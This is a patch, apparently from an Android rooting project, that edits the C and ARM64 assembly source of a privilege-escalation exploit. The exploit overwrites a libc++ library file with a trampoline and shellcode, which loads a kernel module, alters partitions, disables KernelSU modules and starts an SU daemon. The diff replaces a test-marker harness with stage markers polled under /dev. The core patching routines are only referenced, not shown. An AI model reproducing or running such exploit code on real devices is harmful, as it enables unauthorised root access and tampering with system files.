@@ -1,0 +1,169 @@
+--- a/app/src/main/cpp/43284glued/exp.c
++++ b/app/src/main/cpp/43284glued/exp.c
+@@ -13,12 +13,9 @@
+ #include <sys/wait.h>
+ #include <sys/stat.h>
+ #include <sys/utsname.h>
+-#include <sys/xattr.h>
+-#include <time.h>
+ #include <netinet/in.h>
+ #include <arpa/inet.h>
+ #include "aes256.h"
+-#include "m0_marker.h"
+ 
+ #define eos(s) (s + strlen(s))
+ 
+@@ -244,7 +241,6 @@
+ extern uint32_t libcxx_len;
+ extern char libcxx_first_inst_copy[];
+ extern uint32_t libcxx_ko_target_off;
+-extern uint32_t libcxx_m0_worker_arg_off;
+ 
+ asm(
+     ".section .rodata\n"
+@@ -385,16 +381,15 @@
+     return ret;
+ }
+ 
+-static int cleanup(void) {
+-    if (!g_libcxx_r.valid) return 0;
++static void cleanup(void) {
++    if (!g_libcxx_r.valid) return;
+     printf("\n=== cleanup ===\n");
+     printf("restoring trampoline in %s\n", g_libcxx_r.lib);
+-    int trampoline_result = patch_file_cbc(g_libcxx_r.lib,
+-        (char *)g_libcxx_r.tramp_orig, 16, (size_t)g_libcxx_r.tramp_aligned, 0);
++    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
++                   (size_t)g_libcxx_r.tramp_aligned, 0);
+     printf("restoring shellcode in %s\n", g_libcxx_r.lib);
+-    int shellcode_result = patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig,
+-        g_libcxx_r.shell_padded, (size_t)g_libcxx_r.shell_off, 0);
+-    return trampoline_result == 0 && shellcode_result == 0 ? 0 : -1;
++    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
++                   (size_t)g_libcxx_r.shell_off, 0);
+ }
+ 
+ int find_hook_target(const char *lib, const char *sym,
+@@ -542,8 +537,8 @@
+     return 0;
+ }
+ 
+-static int exploit(const char *run_directory) {
+-    printf("\n=== M0 marker fixture exploit ===\n");
++static int exploit(void) {
++    printf("\n=== exploit (patching files) ===\n");
+ 
+     int rc = 3;
+     if (patch_helper()) goto done;
+@@ -556,38 +551,50 @@
+     rc = 2;
+     usleep(500000);
+     
+-    printf("\n=== M0 UMH trigger ===\n");
++    printf("\n=== init  ===\n");
+     createOrphanProcess();
+-    char ready_path[320];
+-    if (snprintf(ready_path, sizeof(ready_path), "%s/ROOT_READY", run_directory) >=
+-        (int)sizeof(ready_path)) { rc = 4; goto done; }
+-    for (int elapsed = 0; elapsed < 15000; elapsed += 10) {
++
++    static const struct {
++        const char *path;
++        const char *msg;
++        int         rc;
++    } markers[] = {
++        { "/dev/df",    "libc++: loading custom module",                    -1 },
++        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
++        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
++        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
++        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
++        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
++        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
++        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
++        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
++        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
++        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
++        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
++        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
++    };
++    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
++
++    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
+         usleep(10000);
+-        if (m0_root_ready_exists(run_directory) == 0) { rc = 0; goto done; }
+-    }
+-    printf("M0_ROOT_READY_TIMEOUT=1\n");
++        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
++            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
++                seen[j] = 1;
++                printf("%s\n", markers[j].msg);
++                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
++            }
++        }
++    }
++    printf("timeout: ERROR - check logcat & dmesg\n");
+ done:
+-    if (rc == 3) printf("M0_PATCH_FAILED=1\n");
++    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+     return rc;
+ }
+ 
+ int main(int argc, char **argv) {
+     setvbuf(stdout, NULL, _IONBF, 0);
+-    if (argc == 3 && strcmp(argv[1], "--m0-root-worker") == 0)
+-        return m0_root_worker_main(argv[2]);
+-    const char *run_directory = getenv("GHOSTLOCK_HOME");
+-    if (run_directory == NULL || m0_prepare_worker_argument(run_directory,
+-            libcxx_data + libcxx_m0_worker_arg_off, 267) != 0) {
+-        fprintf(stderr, "M0_RUN_DIRECTORY_INVALID=1\n");
+-        return 2;
+-    }
+     if (setup(argc, argv) != 0) return 2;
+-    int rc = exploit(run_directory);
+-    int restore_result = cleanup();
+-    if (restore_result != 0) {
+-        printf("M0_KERNEL_FILE_RESTORE_FAILED=1\n");
+-        return 5;
+-    }
+-    if (rc != 0) return rc;
+-    return m0_launcher_release(run_directory);
+-}
++    int rc = exploit();
++    cleanup();
++    return rc;
++}
+--- a/app/src/main/cpp/43284glued/libcxx.S
++++ b/app/src/main/cpp/43284glued/libcxx.S
+@@ -6,7 +6,6 @@
+     .global libcxx_data
+     .global libcxx_len
+     .global libcxx_first_inst_copy
+-    .global libcxx_m0_worker_arg_off
+     .data
+ 
+ 
+@@ -28,13 +27,6 @@
+     .global libcxx_ko_target_off
+ libcxx_ko_target_off:
+     .int ko_target - libcxx_data
+-
+-m0_worker_arg:
+-    .asciz "glk_worker="
+-    .skip 256, 0
+-    .balign 4
+-libcxx_m0_worker_arg_off:
+-    .int m0_worker_arg - libcxx_data
+ 
+     .align 4
+ 
+@@ -124,9 +116,7 @@
+     str     x1, [sp]
+     adr     x1, ko_target
+     str     x1, [sp, 8]
+-    adr     x1, m0_worker_arg
+-    str     x1, [sp, 16]
+-    str     xzr, [sp, 24]
++    str     xzr, [sp, 16]
+     adr     x0, exe_path
+     mov     x1, sp
+     mov     x2, xzr
